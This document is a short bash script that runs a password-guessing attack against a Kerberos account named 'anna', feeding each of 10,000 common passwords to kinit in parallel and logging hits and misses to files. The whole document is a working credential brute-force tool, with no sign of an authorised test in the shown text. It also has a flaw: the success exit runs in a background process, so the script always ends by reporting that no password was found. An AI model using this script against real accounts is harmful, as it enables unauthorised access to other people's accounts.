#!/bin/bash

# Path to the file with the 10,000 most common passwords
password_list_path="./10k-most-common.txt"

# Username for which the password will be tested
username="anna"

# Function to test passwords
check_password() {
    local password="$1"
    echo "$password" | kinit "$username" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Successful login as '$username' with password '$password'"
        echo "$password" >> successful_passwords.txt
        exit 0
    else
        echo "Failed login as '$username' with password '$password'"
        echo "$password" >> failed_passwords.txt
    fi
}

# Read each password from the list and attempt to log in
while IFS= read -r password; do
    check_password "$password" &
done < "$password_list_path"

# Wait for all background processes to finish
wait

# If no valid password was found
echo "No valid password found for '$username'."
exit 1
